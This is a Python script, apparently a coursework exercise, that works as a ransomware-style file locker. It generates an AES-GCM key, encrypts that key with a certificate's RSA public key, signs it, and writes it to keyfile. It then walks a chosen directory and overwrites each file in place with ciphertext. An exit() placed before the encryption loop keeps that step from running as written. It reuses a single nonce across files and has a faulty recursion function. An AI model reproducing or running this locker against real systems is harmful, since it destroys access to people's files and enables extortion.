import argparse
import sys
import os
from datetime import datetime,timedelta
from cryptography.hazmat.primitives import hashes
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa,ec
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d","--dir",help="Dir to lock")
    parser.add_argument("-p","--pubk",help="Action Public Key")
    parser.add_argument("-r","--prik",help="Action Private Key")
    parser.add_argument("-s","--sub",help="Who are we locking")
    args=parser.parse_args()

    if args.dir:
        Dir = args.dir
    if args.pubk:
        pubk = args.pubk
    if args.prik:
        prik = args.prik
    if args.sub:
        sub = args.sub

    return Dir,pubk,prik,sub

  
def sign_it(enc_AES_key_to_sign, private_signing_key,):  #Noah function
  #if isinstance(private_signing_key, rsa.RSAPrivateKey):
    print("\n aes signing key \n")
    print(enc_AES_key_to_sign)
    print(private_signing_key)

    signature = private_signing_key.sign(enc_AES_key_to_sign,ec.ECDSA(hashes.SHA256()))

    print(signature)
    with open('keyfile.sig','wb') as f:
        f.write(signature)
    #return signature

def encrypt_key(RSA_key, AES_key):
    print("The actual key")
    print(AES_key)   #Noah Function
    print(type(AES_key))  
    cipherKey = RSA_key.encrypt(
        AES_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    print("cipher")
    print(cipherKey)
    return cipherKey


def ReccurseLibrary(Dir):
    for filename in os.listdir(Dir):
        if os.path.isdir(filename) == True:
            ReccurseLibrary(filename)
        else:
            print(filename)


if __name__=="__main__":

    Dir,pubk,prik,sub = parse_args()
    x509c = open(pubk,"rb")
    data = x509c.read() 
    key_file = open(prik,"rb")
    keyfile = open("keyfile","wb")

    
    x509c.close()
    
    cert = x509.load_pem_x509_certificate(data,default_backend())
    
    for i in cert.subject:
        if i.value != sub:
            print("Incorrect Subject.")
            exit()
    
    priv_key = serialization.load_pem_private_key(key_file.read(),password=None, backend=default_backend())
    
    key = AESGCM.generate_key(bit_length=128)

    enc_key = encrypt_key(cert.public_key(),key)

    print("da enc key")
    print(type(enc_key))
    print(enc_key)
    keyfile.write(enc_key)
    keyfile.close()

    sign_it(enc_key, priv_key)

    exit()
    
    aesgcm = AESGCM(key)
    nonce = os.urandom(11)
    
    for subdir, dirs, files in os.walk(Dir):
        for file in files:
            tmp = os.path.join(subdir, file)
            f = open(tmp,'rb')
            ct = aesgcm.encrypt(nonce,f.read(),None)
            print(ct)
            f.close()
            wf = open(tmp,"wb")
            wf.write(ct)
            wf.close()
    
        

            
    
    
        
    

